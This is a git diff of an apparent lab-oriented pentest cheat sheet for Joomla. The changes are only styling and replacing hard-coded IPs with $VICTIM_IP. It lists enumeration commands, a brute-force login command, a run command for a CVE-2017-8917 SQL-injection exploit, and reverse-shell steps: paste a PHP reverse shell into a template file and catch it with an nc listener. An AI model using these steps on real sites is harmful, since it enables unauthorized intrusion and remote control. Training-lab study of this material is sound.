@@ -1,7 +1,7 @@
 - `Admin page - /administrator`
 - `Configuration files configuration.php | diagnostics.php | joomla.inc.php | config.inc.php`
 
-### General Information
+### <span style="color:#50FA7B">General Information</span>
 ```bash
 # Checking if Joomla
 curl -s http://dev.inlanefreight.local/ | grep Joomla
@@ -13,10 +13,10 @@ http://dev.inlanefreight.local/robots.txt
 curl -s http://dev.inlanefreight.local/README.txt | head -n 5
 
 # To find the Joomla version
-http://10.10.8.222/language/en-GB/en-GB.xml
+http://$VICTIM_IP/language/en-GB/en-GB.xml
 ```
 
-### Enumeration
+### <span style="color:#50FA7B">Enumeration</span>
 ```bash
 sudo pip3 install droopescan
 droopescan scan joomla --url http://dev.inlanefreight.local
@@ -26,20 +26,20 @@ droopescan scan joomla --url http://dev.inlanefreight.local
 sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 ```
 
-### Joomla  version 3.7.0 (CVE-2017-8917 SQL injection)
+### <span style="color:#50FA7B">Joomla  version 3.7.0 (CVE-2017-8917 SQL injection)</span>
 
 1. Clone the Exploit Repository
 https://github.com/stefanlucas/Exploit-Joomla
 
 2. Run the Exploit Script
 ```
-python3 joomblah.py  http://10.10.8.222/
+python3 joomblah.py  http://$VICTIM_IP/
 ```
 
-### Reverse Shell
+### <span style="color:#50FA7B">Reverse Shell</span>
 
 - Log in to the **Joomla admin dashboard**.
 - Go to **Extensions > Templates** and select the active template i.e (**Protostar Details and Files**).
 - Edit the `error.php` file and paste the **Pentestmonkey PHP reverse shell** code.
 - Set up a listener on your attacker machine `rlwrap -f . -r nc -nvlp 4444`
-- Now, to execute our payload, open a web browser and navigate to `http://<IP>/templates/protostar/error.php.`
+- Now, to execute our payload, open a web browser and navigate to `http://$VICTIM_IP/templates/protostar/error.php.`
